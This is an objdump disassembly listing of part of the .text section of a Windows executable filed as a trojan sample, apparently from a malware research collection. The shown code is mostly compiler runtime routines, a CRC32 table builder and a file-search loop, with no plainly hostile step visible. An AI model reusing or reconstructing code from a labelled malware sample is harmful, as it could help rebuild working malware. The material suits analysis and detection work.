
malware_samples/trojan/c94b9d958d5090787f4311f8378508ad754fb8bb4f81e4fc5b5efac5e31ae446.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	68 10 5f 43 00       	push   $0x435f10
  401005:	e8 6a 06 00 00       	call   0x401674
  40100a:	c3                   	ret
  40100b:	cc                   	int3
  40100c:	cc                   	int3
  40100d:	cc                   	int3
  40100e:	cc                   	int3
  40100f:	cc                   	int3
  401010:	68 a0 9e 42 00       	push   $0x429ea0
  401015:	e8 0f 5b 01 00       	call   0x416b29
  40101a:	59                   	pop    %ecx
  40101b:	c3                   	ret
  40101c:	cc                   	int3
  40101d:	cc                   	int3
  40101e:	cc                   	int3
  40101f:	cc                   	int3
  401020:	e8 03 62 00 00       	call   0x407228
  401025:	a3 48 f0 43 00       	mov    %eax,0x43f048
  40102a:	c3                   	ret
  40102b:	cc                   	int3
  40102c:	cc                   	int3
  40102d:	cc                   	int3
  40102e:	cc                   	int3
  40102f:	cc                   	int3
  401030:	b9 58 f0 43 00       	mov    $0x43f058,%ecx
  401035:	e9 10 71 00 00       	jmp    0x40814a
  40103a:	cc                   	int3
  40103b:	cc                   	int3
  40103c:	cc                   	int3
  40103d:	cc                   	int3
  40103e:	cc                   	int3
  40103f:	cc                   	int3
  401040:	b9 60 f5 43 00       	mov    $0x43f560,%ecx
  401045:	e8 46 ea 00 00       	call   0x40fa90
  40104a:	68 b0 9e 42 00       	push   $0x429eb0
  40104f:	e8 d5 5a 01 00       	call   0x416b29
  401054:	59                   	pop    %ecx
  401055:	c3                   	ret
  401056:	cc                   	int3
  401057:	cc                   	int3
  401058:	cc                   	int3
  401059:	cc                   	int3
  40105a:	cc                   	int3
  40105b:	cc                   	int3
  40105c:	cc                   	int3
  40105d:	cc                   	int3
  40105e:	cc                   	int3
  40105f:	cc                   	int3
  401060:	b9 08 72 46 00       	mov    $0x467208,%ecx
  401065:	e8 cd 4e 00 00       	call   0x405f37
  40106a:	68 c0 9e 42 00       	push   $0x429ec0
  40106f:	e8 b5 5a 01 00       	call   0x416b29
  401074:	59                   	pop    %ecx
  401075:	c3                   	ret
  401076:	cc                   	int3
  401077:	cc                   	int3
  401078:	cc                   	int3
  401079:	cc                   	int3
  40107a:	cc                   	int3
  40107b:	cc                   	int3
  40107c:	cc                   	int3
  40107d:	cc                   	int3
  40107e:	cc                   	int3
  40107f:	cc                   	int3
  401080:	b9 ac bd 45 00       	mov    $0x45bdac,%ecx
  401085:	e9 66 07 00 00       	jmp    0x4017f0
  40108a:	cc                   	int3
  40108b:	cc                   	int3
  40108c:	cc                   	int3
  40108d:	cc                   	int3
  40108e:	cc                   	int3
  40108f:	cc                   	int3
  401090:	b9 c0 bd 45 00       	mov    $0x45bdc0,%ecx
  401095:	e8 b1 30 00 00       	call   0x40414b
  40109a:	68 d0 9e 42 00       	push   $0x429ed0
  40109f:	e8 85 5a 01 00       	call   0x416b29
  4010a4:	59                   	pop    %ecx
  4010a5:	c3                   	ret
  4010a6:	cc                   	int3
  4010a7:	cc                   	int3
  4010a8:	cc                   	int3
  4010a9:	cc                   	int3
  4010aa:	cc                   	int3
  4010ab:	cc                   	int3
  4010ac:	cc                   	int3
  4010ad:	cc                   	int3
  4010ae:	cc                   	int3
  4010af:	cc                   	int3
  4010b0:	b9 9c bd 45 00       	mov    $0x45bd9c,%ecx
  4010b5:	e8 7d 4e 00 00       	call   0x405f37
  4010ba:	68 e0 9e 42 00       	push   $0x429ee0
  4010bf:	e8 65 5a 01 00       	call   0x416b29
  4010c4:	59                   	pop    %ecx
  4010c5:	c3                   	ret
  4010c6:	cc                   	int3
  4010c7:	cc                   	int3
  4010c8:	cc                   	int3
  4010c9:	cc                   	int3
  4010ca:	cc                   	int3
  4010cb:	cc                   	int3
  4010cc:	cc                   	int3
  4010cd:	cc                   	int3
  4010ce:	cc                   	int3
  4010cf:	cc                   	int3
  4010d0:	b9 18 be 45 00       	mov    $0x45be18,%ecx
  4010d5:	e8 bd 01 00 00       	call   0x401297
  4010da:	68 f0 9e 42 00       	push   $0x429ef0
  4010df:	e8 45 5a 01 00       	call   0x416b29
  4010e4:	59                   	pop    %ecx
  4010e5:	c3                   	ret
  4010e6:	cc                   	int3
  4010e7:	cc                   	int3
  4010e8:	cc                   	int3
  4010e9:	cc                   	int3
  4010ea:	cc                   	int3
  4010eb:	cc                   	int3
  4010ec:	cc                   	int3
  4010ed:	cc                   	int3
  4010ee:	cc                   	int3
  4010ef:	cc                   	int3
  4010f0:	68 00 9f 42 00       	push   $0x429f00
  4010f5:	e8 2f 5a 01 00       	call   0x416b29
  4010fa:	59                   	pop    %ecx
  4010fb:	c3                   	ret
  4010fc:	cc                   	int3
  4010fd:	cc                   	int3
  4010fe:	cc                   	int3
  4010ff:	cc                   	int3
  401100:	55                   	push   %ebp
  401101:	8d ac 24 50 fe ff ff 	lea    -0x1b0(%esp),%ebp
  401108:	81 ec 30 02 00 00    	sub    $0x230,%esp
  40110e:	a1 5c 56 43 00       	mov    0x43565c,%eax
  401113:	33 c5                	xor    %ebp,%eax
  401115:	89 85 ac 01 00 00    	mov    %eax,0x1ac(%ebp)
  40111b:	53                   	push   %ebx
  40111c:	8b 9d c0 01 00 00    	mov    0x1c0(%ebp),%ebx
  401122:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401125:	56                   	push   %esi
  401126:	8b b5 b8 01 00 00    	mov    0x1b8(%ebp),%esi
  40112c:	57                   	push   %edi
  40112d:	8b bd bc 01 00 00    	mov    0x1bc(%ebp),%edi
  401133:	50                   	push   %eax
  401134:	ff 15 7c b0 46 00    	call   *0x46b07c
  40113a:	85 c0                	test   %eax,%eax
  40113c:	75 53                	jne    0x401191
  40113e:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401141:	89 75 80             	mov    %esi,-0x80(%ebp)
  401144:	33 c9                	xor    %ecx,%ecx
  401146:	89 45 88             	mov    %eax,-0x78(%ebp)
  401149:	8d 45 80             	lea    -0x80(%ebp),%eax
  40114c:	89 4d 84             	mov    %ecx,-0x7c(%ebp)
  40114f:	50                   	push   %eax
  401150:	89 7d 8c             	mov    %edi,-0x74(%ebp)
  401153:	c7 45 90 41 00 00 00 	movl   $0x41,-0x70(%ebp)
  40115a:	89 4d 94             	mov    %ecx,-0x6c(%ebp)
  40115d:	89 4d 98             	mov    %ecx,-0x68(%ebp)
  401160:	ff 15 6c b0 46 00    	call   *0x46b06c
  401166:	8b f0                	mov    %eax,%esi
  401168:	85 f6                	test   %esi,%esi
  40116a:	74 25                	je     0x401191
  40116c:	53                   	push   %ebx
  40116d:	56                   	push   %esi
  40116e:	ff 15 70 b0 46 00    	call   *0x46b070
  401174:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  401177:	85 c0                	test   %eax,%eax
  401179:	56                   	push   %esi
  40117a:	51                   	push   %ecx
  40117b:	0f 95 c3             	setne  %bl
  40117e:	8b 11                	mov    (%ecx),%edx
  401180:	8b 72 14             	mov    0x14(%edx),%esi
  401183:	8b ce                	mov    %esi,%ecx
  401185:	ff 15 30 a2 42 00    	call   *0x42a230
  40118b:	ff d6                	call   *%esi
  40118d:	8a c3                	mov    %bl,%al
  40118f:	eb 02                	jmp    0x401193
  401191:	32 c0                	xor    %al,%al
  401193:	8b 8d ac 01 00 00    	mov    0x1ac(%ebp),%ecx
  401199:	5f                   	pop    %edi
  40119a:	5e                   	pop    %esi
  40119b:	33 cd                	xor    %ebp,%ecx
  40119d:	5b                   	pop    %ebx
  40119e:	e8 b6 53 01 00       	call   0x416559
  4011a3:	81 c5 b0 01 00 00    	add    $0x1b0,%ebp
  4011a9:	c9                   	leave
  4011aa:	c2 10 00             	ret    $0x10
  4011ad:	cc                   	int3
  4011ae:	cc                   	int3
  4011af:	cc                   	int3
  4011b0:	c2 00 00             	ret    $0x0
  4011b3:	0f b6 44 24 0c       	movzbl 0xc(%esp),%eax
  4011b8:	50                   	push   %eax
  4011b9:	ff 74 24 0c          	push   0xc(%esp)
  4011bd:	ff 74 24 0c          	push   0xc(%esp)
  4011c1:	ff 15 4c b1 46 00    	call   *0x46b14c
  4011c7:	50                   	push   %eax
  4011c8:	ff 15 48 b1 46 00    	call   *0x46b148
  4011ce:	c2 0c 00             	ret    $0xc
  4011d1:	0f b6 44 24 0c       	movzbl 0xc(%esp),%eax
  4011d6:	f7 d8                	neg    %eax
  4011d8:	1b c0                	sbb    %eax,%eax
  4011da:	83 e0 09             	and    $0x9,%eax
  4011dd:	50                   	push   %eax
  4011de:	ff 74 24 0c          	push   0xc(%esp)
  4011e2:	ff 74 24 0c          	push   0xc(%esp)
  4011e6:	ff 15 4c b1 46 00    	call   *0x46b14c
  4011ec:	50                   	push   %eax
  4011ed:	ff 15 58 b1 46 00    	call   *0x46b158
  4011f3:	c2 0c 00             	ret    $0xc
  4011f6:	55                   	push   %ebp
  4011f7:	8b ec                	mov    %esp,%ebp
  4011f9:	83 7d 0c 30          	cmpl   $0x30,0xc(%ebp)
  4011fd:	74 59                	je     0x401258
  4011ff:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  401206:	75 5d                	jne    0x401265
  401208:	8a 45 20             	mov    0x20(%ebp),%al
  40120b:	b9 c0 bd 45 00       	mov    $0x45bdc0,%ecx
  401210:	24 01                	and    $0x1,%al
  401212:	0f b6 c0             	movzbl %al,%eax
  401215:	50                   	push   %eax
  401216:	ff 75 18             	push   0x18(%ebp)
  401219:	ff 75 08             	push   0x8(%ebp)
  40121c:	e8 43 3e 00 00       	call   0x405064
  401221:	f6 45 20 01          	testb  $0x1,0x20(%ebp)
  401225:	74 3e                	je     0x401265
  401227:	ff 75 08             	push   0x8(%ebp)
  40122a:	ff 15 40 b1 46 00    	call   *0x46b140
  401230:	85 c0                	test   %eax,%eax
  401232:	74 31                	je     0x401265
  401234:	68 21 30 00 00       	push   $0x3021
  401239:	50                   	push   %eax
  40123a:	ff 15 4c b1 46 00    	call   *0x46b14c
  401240:	85 c0                	test   %eax,%eax
  401242:	74 21                	je     0x401265
  401244:	f6 45 20 08          	testb  $0x8,0x20(%ebp)
  401248:	74 1b                	je     0x401265
  40124a:	68 84 a5 42 00       	push   $0x42a584
  40124f:	50                   	push   %eax
  401250:	ff 15 44 b1 46 00    	call   *0x46b144
  401256:	eb 0d                	jmp    0x401265
  401258:	ff 75 08             	push   0x8(%ebp)
  40125b:	b9 c0 bd 45 00       	mov    $0x45bdc0,%ecx
  401260:	e8 d8 3d 00 00       	call   0x40503d
  401265:	32 c0                	xor    %al,%al
  401267:	5d                   	pop    %ebp
  401268:	c2 1c 00             	ret    $0x1c
  40126b:	55                   	push   %ebp
  40126c:	8b ec                	mov    %esp,%ebp
  40126e:	8b 45 0c             	mov    0xc(%ebp),%eax
  401271:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401276:	72 10                	jb     0x401288
  401278:	8d 45 0c             	lea    0xc(%ebp),%eax
  40127b:	50                   	push   %eax
  40127c:	8d 45 08             	lea    0x8(%ebp),%eax
  40127f:	50                   	push   %eax
  401280:	e8 75 03 00 00       	call   0x4015fa
  401285:	8b 45 0c             	mov    0xc(%ebp),%eax
  401288:	50                   	push   %eax
  401289:	ff 75 08             	push   0x8(%ebp)
  40128c:	e8 d6 52 01 00       	call   0x416567
  401291:	59                   	pop    %ecx
  401292:	59                   	pop    %ecx
  401293:	5d                   	pop    %ebp
  401294:	c2 08 00             	ret    $0x8
  401297:	6a 04                	push   $0x4
  401299:	b8 97 9a 42 00       	mov    $0x429a97,%eax
  40129e:	e8 e6 52 01 00       	call   0x416589
  4012a3:	8b f1                	mov    %ecx,%esi
  4012a5:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4012a8:	e8 d3 24 00 00       	call   0x403780
  4012ad:	8d 8e 04 b2 00 00    	lea    0xb204(%esi),%ecx
  4012b3:	e8 f4 5d 00 00       	call   0x4070ac
  4012b8:	33 ff                	xor    %edi,%edi
  4012ba:	8d 8e 60 b2 00 00    	lea    0xb260(%esi),%ecx
  4012c0:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4012c3:	e8 e4 5d 00 00       	call   0x4070ac
  4012c8:	8d 8e bc b2 00 00    	lea    0xb2bc(%esi),%ecx
  4012ce:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4012d2:	e8 d5 5d 00 00       	call   0x4070ac
  4012d7:	8d 8e 18 b3 00 00    	lea    0xb318(%esi),%ecx
  4012dd:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4012e1:	e8 c6 5d 00 00       	call   0x4070ac
  4012e6:	8d 8e 74 b3 00 00    	lea    0xb374(%esi),%ecx
  4012ec:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  4012f0:	e8 b7 5d 00 00       	call   0x4070ac
  4012f5:	8d 8e d0 b3 00 00    	lea    0xb3d0(%esi),%ecx
  4012fb:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  4012ff:	e8 33 4c 00 00       	call   0x405f37
  401304:	89 be e0 b3 00 00    	mov    %edi,0xb3e0(%esi)
  40130a:	89 be e4 b3 00 00    	mov    %edi,0xb3e4(%esi)
  401310:	89 be e8 b3 00 00    	mov    %edi,0xb3e8(%esi)
  401316:	8b ce                	mov    %esi,%ecx
  401318:	c6 45 fc 06          	movb   $0x6,-0x4(%ebp)
  40131c:	e8 a2 01 00 00       	call   0x4014c3
  401321:	8b c6                	mov    %esi,%eax
  401323:	e8 4d 52 01 00       	call   0x416575
  401328:	c3                   	ret
  401329:	83 39 00             	cmpl   $0x0,(%ecx)
  40132c:	74 08                	je     0x401336
  40132e:	ff 31                	push   (%ecx)
  401330:	e8 74 a1 01 00       	call   0x41b4a9
  401335:	59                   	pop    %ecx
  401336:	c3                   	ret
  401337:	e9 e3 02 00 00       	jmp    0x40161f
  40133c:	e9 e8 ff ff ff       	jmp    0x401329
  401341:	81 c1 18 b3 00 00    	add    $0xb318,%ecx
  401347:	e9 f5 5d 00 00       	jmp    0x407141
  40134c:	b8 08 20 00 00       	mov    $0x2008,%eax
  401351:	e8 aa 52 01 00       	call   0x416600
  401356:	a1 5c 56 43 00       	mov    0x43565c,%eax
  40135b:	33 c4                	xor    %esp,%eax
  40135d:	89 84 24 04 20 00 00 	mov    %eax,0x2004(%esp)
  401364:	8b 84 24 14 20 00 00 	mov    0x2014(%esp),%eax
  40136b:	53                   	push   %ebx
  40136c:	8b 9c 24 10 20 00 00 	mov    0x2010(%esp),%ebx
  401373:	55                   	push   %ebp
  401374:	56                   	push   %esi
  401375:	57                   	push   %edi
  401376:	6a 00                	push   $0x0
  401378:	6a 00                	push   $0x0
  40137a:	50                   	push   %eax
  40137b:	e8 c8 25 00 00       	call   0x403948
  401380:	8b cb                	mov    %ebx,%ecx
  401382:	8b e8                	mov    %eax,%ebp
  401384:	e8 9a 5e 00 00       	call   0x407223
  401389:	e9 a6 00 00 00       	jmp    0x401434
  40138e:	8d 44 24 10          	lea    0x10(%esp),%eax
  401392:	50                   	push   %eax
  401393:	e8 75 2c 00 00       	call   0x40400d
  401398:	8b f0                	mov    %eax,%esi
  40139a:	0f b7 0e             	movzwl (%esi),%ecx
  40139d:	51                   	push   %ecx
  40139e:	e8 10 2b 00 00       	call   0x403eb3
  4013a3:	80 bc 24 20 20 00 00 	cmpb   $0x0,0x2020(%esp)
  4013aa:	00 
  4013ab:	74 0b                	je     0x4013b8
  4013ad:	84 c0                	test   %al,%al
  4013af:	74 1b                	je     0x4013cc
  4013b1:	33 c0                	xor    %eax,%eax
  4013b3:	66 89 06             	mov    %ax,(%esi)
  4013b6:	eb 14                	jmp    0x4013cc
  4013b8:	84 c0                	test   %al,%al
  4013ba:	74 10                	je     0x4013cc
  4013bc:	57                   	push   %edi
  4013bd:	68 80 a5 42 00       	push   $0x42a580
  4013c2:	8d 44 24 18          	lea    0x18(%esp),%eax
  4013c6:	50                   	push   %eax
  4013c7:	e8 83 5c 00 00       	call   0x40704f
  4013cc:	6a 00                	push   $0x0
  4013ce:	6a 00                	push   $0x0
  4013d0:	8d 44 24 18          	lea    0x18(%esp),%eax
  4013d4:	8b fd                	mov    %ebp,%edi
  4013d6:	50                   	push   %eax
  4013d7:	e8 6c 25 00 00       	call   0x403948
  4013dc:	8b f0                	mov    %eax,%esi
  4013de:	66 83 3e 2a          	cmpw   $0x2a,(%esi)
  4013e2:	75 3e                	jne    0x401422
  4013e4:	0f b7 4e 02          	movzwl 0x2(%esi),%ecx
  4013e8:	51                   	push   %ecx
  4013e9:	e8 c5 2a 00 00       	call   0x403eb3
  4013ee:	84 c0                	test   %al,%al
  4013f0:	74 30                	je     0x401422
  4013f2:	6a 2e                	push   $0x2e
  4013f4:	58                   	pop    %eax
  4013f5:	6a 5c                	push   $0x5c
  4013f7:	66 89 84 24 14 10 00 	mov    %ax,0x1014(%esp)
  4013fe:	00 
  4013ff:	58                   	pop    %eax
  401400:	68 00 08 00 00       	push   $0x800
  401405:	66 89 84 24 16 10 00 	mov    %ax,0x1016(%esp)
  40140c:	00 
  40140d:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  401414:	55                   	push   %ebp
  401415:	50                   	push   %eax
  401416:	e8 5c 5c 00 00       	call   0x407077
  40141b:	8d bc 24 10 10 00 00 	lea    0x1010(%esp),%edi
  401422:	ff b4 24 2c 20 00 00 	push   0x202c(%esp)
  401429:	57                   	push   %edi
  40142a:	56                   	push   %esi
  40142b:	e8 0b 20 00 00       	call   0x40343b
  401430:	84 c0                	test   %al,%al
  401432:	75 35                	jne    0x401469
  401434:	bf 00 08 00 00       	mov    $0x800,%edi
  401439:	8d 44 24 10          	lea    0x10(%esp),%eax
  40143d:	57                   	push   %edi
  40143e:	50                   	push   %eax
  40143f:	8b cb                	mov    %ebx,%ecx
  401441:	e8 85 5d 00 00       	call   0x4071cb
  401446:	84 c0                	test   %al,%al
  401448:	0f 85 40 ff ff ff    	jne    0x40138e
  40144e:	8b 8c 24 14 20 00 00 	mov    0x2014(%esp),%ecx
  401455:	5f                   	pop    %edi
  401456:	5e                   	pop    %esi
  401457:	5d                   	pop    %ebp
  401458:	5b                   	pop    %ebx
  401459:	33 cc                	xor    %esp,%ecx
  40145b:	e8 f9 50 01 00       	call   0x416559
  401460:	81 c4 08 20 00 00    	add    $0x2008,%esp
  401466:	c2 14 00             	ret    $0x14
  401469:	b0 01                	mov    $0x1,%al
  40146b:	eb e1                	jmp    0x40144e
  40146d:	55                   	push   %ebp
  40146e:	8b ec                	mov    %esp,%ebp
  401470:	56                   	push   %esi
  401471:	6a 06                	push   $0x6
  401473:	ff 75 10             	push   0x10(%ebp)
  401476:	8b f1                	mov    %ecx,%esi
  401478:	ff 75 08             	push   0x8(%ebp)
  40147b:	ff 75 0c             	push   0xc(%ebp)
  40147e:	8d 86 60 b2 00 00    	lea    0xb260(%esi),%eax
  401484:	50                   	push   %eax
  401485:	e8 c2 fe ff ff       	call   0x40134c
  40148a:	84 c0                	test   %al,%al
  40148c:	74 04                	je     0x401492
  40148e:	b0 01                	mov    $0x1,%al
  401490:	eb 2c                	jmp    0x4014be
  401492:	80 7d 14 00          	cmpb   $0x0,0x14(%ebp)
  401496:	74 24                	je     0x4014bc
  401498:	83 be d0 b2 00 00 00 	cmpl   $0x0,0xb2d0(%esi)
  40149f:	74 1b                	je     0x4014bc
  4014a1:	6a 06                	push   $0x6
  4014a3:	ff 75 10             	push   0x10(%ebp)
  4014a6:	8d 86 bc b2 00 00    	lea    0xb2bc(%esi),%eax
  4014ac:	ff 75 08             	push   0x8(%ebp)
  4014af:	ff 75 0c             	push   0xc(%ebp)
  4014b2:	50                   	push   %eax
  4014b3:	e8 94 fe ff ff       	call   0x40134c
  4014b8:	84 c0                	test   %al,%al
  4014ba:	74 d2                	je     0x40148e
  4014bc:	32 c0                	xor    %al,%al
  4014be:	5e                   	pop    %esi
  4014bf:	5d                   	pop    %ebp
  4014c0:	c2 10 00             	ret    $0x10
  4014c3:	56                   	push   %esi
  4014c4:	8b f1                	mov    %ecx,%esi
  4014c6:	e8 0b 23 00 00       	call   0x4037d6
  4014cb:	33 c0                	xor    %eax,%eax
  4014cd:	8d 8e 04 b2 00 00    	lea    0xb204(%esi),%ecx
  4014d3:	66 89 86 e2 91 00 00 	mov    %ax,0x91e2(%esi)
  4014da:	66 89 86 02 a2 00 00 	mov    %ax,0xa202(%esi)
  4014e1:	66 89 86 d8 91 00 00 	mov    %ax,0x91d8(%esi)
  4014e8:	89 86 dc 91 00 00    	mov    %eax,0x91dc(%esi)
  4014ee:	88 86 e0 91 00 00    	mov    %al,0x91e0(%esi)
  4014f4:	e8 14 5d 00 00       	call   0x40720d
  4014f9:	8d 8e 60 b2 00 00    	lea    0xb260(%esi),%ecx
  4014ff:	e8 09 5d 00 00       	call   0x40720d
  401504:	8d 8e bc b2 00 00    	lea    0xb2bc(%esi),%ecx
  40150a:	e8 fe 5c 00 00       	call   0x40720d
  40150f:	8d 8e 18 b3 00 00    	lea    0xb318(%esi),%ecx
  401515:	e8 f3 5c 00 00       	call   0x40720d
  40151a:	8d 8e 74 b3 00 00    	lea    0xb374(%esi),%ecx
  401520:	e8 e8 5c 00 00       	call   0x40720d
  401525:	8d 8e d0 b3 00 00    	lea    0xb3d0(%esi),%ecx
  40152b:	e8 7e 4a 00 00       	call   0x405fae
  401530:	8b 86 e0 b3 00 00    	mov    0xb3e0(%esi),%eax
  401536:	3b 86 e4 b3 00 00    	cmp    0xb3e4(%esi),%eax
  40153c:	74 06                	je     0x401544
  40153e:	89 86 e4 b3 00 00    	mov    %eax,0xb3e4(%esi)
  401544:	5e                   	pop    %esi
  401545:	c3                   	ret
  401546:	51                   	push   %ecx
  401547:	51                   	push   %ecx
  401548:	53                   	push   %ebx
  401549:	55                   	push   %ebp
  40154a:	56                   	push   %esi
  40154b:	8b 74 24 28          	mov    0x28(%esp),%esi
  40154f:	57                   	push   %edi
  401550:	8b f9                	mov    %ecx,%edi
  401552:	85 f6                	test   %esi,%esi
  401554:	74 0c                	je     0x401562
  401556:	83 7c 24 30 00       	cmpl   $0x0,0x30(%esp)
  40155b:	76 05                	jbe    0x401562
  40155d:	33 c0                	xor    %eax,%eax
  40155f:	66 89 06             	mov    %ax,(%esi)
  401562:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401566:	33 db                	xor    %ebx,%ebx
  401568:	43                   	inc    %ebx
  401569:	53                   	push   %ebx
  40156a:	6a 00                	push   $0x0
  40156c:	8a 81 e9 10 00 00    	mov    0x10e9(%ecx),%al
  401572:	8d 69 28             	lea    0x28(%ecx),%ebp
  401575:	88 44 24 18          	mov    %al,0x18(%esp)
  401579:	8b cf                	mov    %edi,%ecx
  40157b:	ff 74 24 18          	push   0x18(%esp)
  40157f:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  401583:	55                   	push   %ebp
  401584:	e8 e4 fe ff ff       	call   0x40146d
  401589:	84 c0                	test   %al,%al
  40158b:	75 34                	jne    0x4015c1
  40158d:	81 c7 04 b2 00 00    	add    $0xb204,%edi
  401593:	8b cf                	mov    %edi,%ecx
  401595:	89 7c 24 10          	mov    %edi,0x10(%esp)
  401599:	e8 85 5c 00 00       	call   0x407223
  40159e:	8b cf                	mov    %edi,%ecx
  4015a0:	eb 14                	jmp    0x4015b6
  4015a2:	ff 74 24 24          	push   0x24(%esp)
  4015a6:	55                   	push   %ebp
  4015a7:	57                   	push   %edi
  4015a8:	e8 8e 1e 00 00       	call   0x40343b
  4015ad:	84 c0                	test   %al,%al
  4015af:	75 1b                	jne    0x4015cc
  4015b1:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4015b5:	43                   	inc    %ebx
  4015b6:	e8 c2 5b 00 00       	call   0x40717d
  4015bb:	8b f8                	mov    %eax,%edi
  4015bd:	85 ff                	test   %edi,%edi
  4015bf:	75 e1                	jne    0x4015a2
  4015c1:	33 c0                	xor    %eax,%eax
  4015c3:	5f                   	pop    %edi
  4015c4:	5e                   	pop    %esi
  4015c5:	5d                   	pop    %ebp
  4015c6:	5b                   	pop    %ebx
  4015c7:	59                   	pop    %ecx
  4015c8:	59                   	pop    %ecx
  4015c9:	c2 18 00             	ret    $0x18
  4015cc:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  4015d0:	85 ed                	test   %ebp,%ebp
  4015d2:	74 13                	je     0x4015e7
  4015d4:	ff 74 24 14          	push   0x14(%esp)
  4015d8:	57                   	push   %edi
  4015d9:	e8 6c 5a 00 00       	call   0x40704a
  4015de:	f7 d8                	neg    %eax
  4015e0:	1a c0                	sbb    %al,%al
  4015e2:	fe c0                	inc    %al
  4015e4:	88 45 00             	mov    %al,0x0(%ebp)
  4015e7:	85 f6                	test   %esi,%esi
  4015e9:	74 0b                	je     0x4015f6
  4015eb:	ff 74 24 30          	push   0x30(%esp)
  4015ef:	57                   	push   %edi
  4015f0:	56                   	push   %esi
  4015f1:	e8 81 5a 00 00       	call   0x407077
  4015f6:	8b c3                	mov    %ebx,%eax
  4015f8:	eb c9                	jmp    0x4015c3
  4015fa:	8b 44 24 08          	mov    0x8(%esp),%eax
  4015fe:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401602:	83 00 23             	addl   $0x23,(%eax)
  401605:	8b 01                	mov    (%ecx),%eax
  401607:	8b 50 fc             	mov    -0x4(%eax),%edx
  40160a:	2b c2                	sub    %edx,%eax
  40160c:	83 c0 fc             	add    $0xfffffffc,%eax
  40160f:	83 f8 1f             	cmp    $0x1f,%eax
  401612:	77 05                	ja     0x401619
  401614:	89 11                	mov    %edx,(%ecx)
  401616:	c2 08 00             	ret    $0x8
  401619:	e8 3b 9e 01 00       	call   0x41b459
  40161e:	cc                   	int3
  40161f:	56                   	push   %esi
  401620:	8b f1                	mov    %ecx,%esi
  401622:	83 3e 00             	cmpl   $0x0,(%esi)
  401625:	74 1a                	je     0x401641
  401627:	8b 46 08             	mov    0x8(%esi),%eax
  40162a:	2b 06                	sub    (%esi),%eax
  40162c:	83 e0 f8             	and    $0xfffffff8,%eax
  40162f:	50                   	push   %eax
  401630:	ff 36                	push   (%esi)
  401632:	e8 34 fc ff ff       	call   0x40126b
  401637:	33 c0                	xor    %eax,%eax
  401639:	89 06                	mov    %eax,(%esi)
  40163b:	89 46 04             	mov    %eax,0x4(%esi)
  40163e:	89 46 08             	mov    %eax,0x8(%esi)
  401641:	5e                   	pop    %esi
  401642:	c3                   	ret
  401643:	8b 54 24 04          	mov    0x4(%esp),%edx
  401647:	56                   	push   %esi
  401648:	8b 74 24 10          	mov    0x10(%esp),%esi
  40164c:	57                   	push   %edi
  40164d:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401651:	85 f6                	test   %esi,%esi
  401653:	74 18                	je     0x40166d
  401655:	0f b6 0f             	movzbl (%edi),%ecx
  401658:	0f b6 c2             	movzbl %dl,%eax
  40165b:	33 c8                	xor    %eax,%ecx
  40165d:	c1 ea 08             	shr    $0x8,%edx
  401660:	33 14 8d 10 5f 43 00 	xor    0x435f10(,%ecx,4),%edx
  401667:	47                   	inc    %edi
  401668:	83 ee 01             	sub    $0x1,%esi
  40166b:	75 e8                	jne    0x401655
  40166d:	5f                   	pop    %edi
  40166e:	8b c2                	mov    %edx,%eax
  401670:	5e                   	pop    %esi
  401671:	c2 0c 00             	ret    $0xc
  401674:	56                   	push   %esi
  401675:	8b 74 24 08          	mov    0x8(%esp),%esi
  401679:	33 c0                	xor    %eax,%eax
  40167b:	39 46 04             	cmp    %eax,0x4(%esi)
  40167e:	75 28                	jne    0x4016a8
  401680:	57                   	push   %edi
  401681:	6a 08                	push   $0x8
  401683:	8b c8                	mov    %eax,%ecx
  401685:	5f                   	pop    %edi
  401686:	8b d1                	mov    %ecx,%edx
  401688:	d1 ea                	shr    $1,%edx
  40168a:	f6 c1 01             	test   $0x1,%cl
  40168d:	8b ca                	mov    %edx,%ecx
  40168f:	74 06                	je     0x401697
  401691:	81 f1 20 83 b8 ed    	xor    $0xedb88320,%ecx
  401697:	83 ef 01             	sub    $0x1,%edi
  40169a:	75 ea                	jne    0x401686
  40169c:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  40169f:	40                   	inc    %eax
  4016a0:	3d 00 01 00 00       	cmp    $0x100,%eax
  4016a5:	72 da                	jb     0x401681
  4016a7:	5f                   	pop    %edi
  4016a8:	5e                   	pop    %esi
  4016a9:	c2 04 00             	ret    $0x4
  4016ac:	55                   	push   %ebp
  4016ad:	8b ec                	mov    %esp,%ebp
  4016af:	83 ec 50             	sub    $0x50,%esp
  4016b2:	a1 5c 56 43 00       	mov    0x43565c,%eax
  4016b7:	33 c5                	xor    %ebp,%eax
  4016b9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4016bc:	ff 75 08             	push   0x8(%ebp)
  4016bf:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4016c2:	e8 3e 01 00 00       	call   0x401805
  4016c7:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4016ca:	e8 7f 64 00 00       	call   0x407b4e
  4016cf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4016d2:	33 cd                	xor    %ebp,%ecx
  4016d4:	e8 80 4e 01 00       	call   0x416559
  4016d9:	c9                   	leave
  4016da:	c2 04 00             	ret    $0x4
  4016dd:	55                   	push   %ebp
  4016de:	8b ec                	mov    %esp,%ebp
  4016e0:	83 ec 50             	sub    $0x50,%esp
  4016e3:	a1 5c 56 43 00       	mov    0x43565c,%eax
  4016e8:	33 c5                	xor    %ebp,%eax
  4016ea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4016ed:	ff 75 08             	push   0x8(%ebp)
  4016f0:	8d 4d b0             	lea    -0x50(%ebp),%ecx
